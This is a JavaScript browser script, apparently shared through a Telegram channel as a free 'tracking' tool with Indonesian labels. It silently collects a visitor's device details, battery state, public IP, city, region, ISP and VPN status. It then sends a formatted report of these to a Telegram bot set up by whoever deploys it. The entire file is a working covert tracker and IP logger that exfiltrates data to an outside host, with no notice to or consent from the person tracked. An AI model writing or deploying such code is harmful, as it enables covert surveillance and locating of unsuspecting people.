// ==== TRACKING FREE VERSION ==== //
// ==== TELEGRAM @XemzzXiterz ==== //
const startTracking = async () => {
    const formatWaktu = () => {
        return new Date().toLocaleString('id-ID', {
            weekday: 'long',
            day: 'numeric',
            month: 'long',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    };
    
    const sendToTelegram = async (text) => {
        return fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: config.chatId,
                text: text,
                parse_mode: 'HTML'
            })
        });
    };
    
    const getLocationInfo = async () => {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                ip: data.ip,
                city: data.city || 'Tidak diketahui',
                region: data.region || 'Tidak diketahui',
                country: data.country_name || 'Tidak diketahui',
                isp: data.org || 'Tidak diketahui',
                vpn: data.vpn || data.proxy ? 'Ya' : 'Tidak'
            };
        } catch (e) {
            return {
                ip: 'Gagal mendapatkan',
                city: 'Gagal mendapatkan',
                region: 'Gagal mendapatkan',
                country: 'Gagal mendapatkan',
                isp: 'Gagal mendapatkan',
                vpn: 'Gagal mendapatkan'
            };
        }
    };
    
    const getBatteryInfo = async () => {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            return {
                level: Math.floor(battery.level * 100),
                charging: battery.charging ? 'Ya' : 'Tidak',
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        }
        return null;
    };
    
    const locationInfo = await getLocationInfo();
    const batteryInfo = await getBatteryInfo();
    
    const report = `
<pre>╭────────────── HASIL CUY ──────────────╮

📅 <b>Waktu:</b> ${formatWaktu()}

📱 <b>Informasi Perangkat:</b>
   • Platform: ${navigator.platform}
   • Browser: ${navigator.userAgent}
   • Ukuran Layar: ${screen.width}x${screen.height}
   • CPU Cores: ${navigator.hardwareConcurrency || 'Tidak diketahui'}
   • RAM: ${navigator.deviceMemory || 'Tidak diketahui'} GB
   • Touchscreen: ${'ontouchstart' in window ? 'Ya' : 'Tidak'}
   • Online: ${navigator.onLine ? 'Ya' : 'Tidak'}

🌐 <b>Informasi Jaringan:</b>
   • IP: ${locationInfo.ip}
   • Kota/Kab: ${locationInfo.city}
   • Provinsi: ${locationInfo.region}
   • Negara: ${locationInfo.country}
   • ISP: ${locationInfo.isp}
   • VPN/Proxy: ${locationInfo.vpn}

${batteryInfo ? `
🔋 <b>Informasi Baterai:</b>
   • Level: ${batteryInfo.level}%
   • Sedang Dicharge: ${batteryInfo.charging}
` : ''}

╰───────── DEVELOPER @XemzzXiterz ─────────╯</pre>

<blockquote>CH: https://t.me/+toDQtab6PsZiM2M9
NOTE: <code>TRACKING INI FREE, JIKA ADA YANG MENJUAL SEGERA HUBUNGI DEVELOPER</code></blockquote>
    `;
    
    await sendToTelegram(report);
};

window.startTracking = startTracking;